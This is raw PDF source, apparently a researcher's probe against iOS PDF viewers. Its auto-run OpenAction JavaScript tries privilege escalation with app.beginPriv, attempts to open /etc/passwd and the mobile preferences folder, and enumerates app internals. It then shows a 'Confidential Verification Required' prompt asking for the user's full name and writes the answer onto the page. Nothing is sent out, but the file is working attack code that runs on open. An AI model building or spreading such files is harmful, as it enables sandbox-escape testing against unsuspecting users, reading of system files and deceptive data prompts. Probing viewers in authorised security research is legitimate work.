%PDF-1.7
% beginPriv File Read Probe + Visible Input on Page - iOS - March 2026
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 3 0 R
>>
endobj
2 0 obj
<< /Type /Pages
   /Kids [4 0 R]
   /Count 1
>>
endobj
3 0 obj
<< /Type /Action
   /S /JavaScript
   /JS (
      try {
        var results = [];
        results.push("=== PRIV CONTEXT ===");
        try {
          app.beginPriv();
          results.push("beginPriv: ok");
          try {
            var d1 = app.openDoc("/etc/passwd");
            results.push("openDoc passwd: " + typeof d1 + " " + d1);
          } catch(e) { results.push("openDoc passwd: " + e); }
          try {
            var d2 = app.openDoc("/var/mobile/Library/Preferences/");
            results.push("openDoc prefs: " + typeof d2 + " " + d2);
          } catch(e) { results.push("openDoc prefs: " + e); }
          try {
            var d3 = app.openDoc(this.path);
            results.push("openDoc self: " + typeof d3);
          } catch(e) { results.push("openDoc self: " + e); }
          try {
            results.push("response type: " + typeof app.response);
          } catch(e) { results.push("response: " + e); }
          try {
            results.push("priv doc.path: " + this.path);
            results.push("priv doc.URL: " + this.URL);
          } catch(e) { results.push("doc props: " + e); }
          try {
            var privKeys = [];
            for (var k in app) {
              privKeys.push(k + ":" + typeof app[k]);
            }
            results.push("app keys in priv: " + privKeys.join(", "));
          } catch(e) { results.push("app enum priv: " + e); }
          app.endPriv();
          results.push("endPriv: ok");
        } catch(e) { results.push("priv block: " + e); }

        results.push("=== INTER-DOC ===");
        try {
          results.push("numDocs: " + app.numDocs);
        } catch(e) { results.push("numDocs: " + e); }

        results.push("=== INPUT CAPTURE ===");
        try {
          var resp = app.response({
            cQuestion: "Please enter your full name or any text (it will be shown in the alert and attempted on page)",
            cTitle: "Confidential Verification Required",
            cDefault: ""
          });

          if (resp != null && resp !== "") {
            results.push("response captured: " + resp);

            // Safe attempt to display on PDF - won't break the script if addField is blocked
            try {
              var f = this.getField("UserInputField");
              if (f == null) {
                f = this.addField({
                  cName: "UserInputField",
                  nPage: 0,
                  nType: "text",
                  r: [30, 80, 370, 140]
                });
                f.borderStyle = border.s;
                f.fillColor = color.white;
                f.textColor = color.red;
                f.textSize = 18;
                f.font = "Helvetica-Bold";
                f.multiline = true;
                f.readonly = true;
              }
              f.value = "You entered:\n" + resp;
              results.push("Input written to visible field on PDF");
            } catch(e) {
              results.push("Could not create/display field on page: " + e);
            }
          } else {
            results.push("User cancelled or empty input");
          }
        } catch(e) { results.push("response error: " + e); }

        app.alert(results.join("\\n"));
      } catch(e) {
        app.alert("OUTER ERROR: " + e);
      }
   )
>>
endobj
4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 400 300]
   /Contents 5 0 R
>>
endobj
5 0 obj
<< /Length 110 >>
stream
BT /F1 14 Tf 50 250 Td (Priv Escalation Probe) Tj ET
BT /F1 12 Tf 50 220 Td (Enter text in popup) Tj ET
BT /F1 12 Tf 50 190 Td (It should appear on page if supported) Tj ET
endstream
endobj
xref
0 6
0000000000 65535 f
0000000015 00000 n
0000000075 00000 n
0000000135 00000 n
0000002500 00000 n
0000002660 00000 n
trailer
<< /Size 6 /Root 1 0 R >>
startxref
2750
%%EOF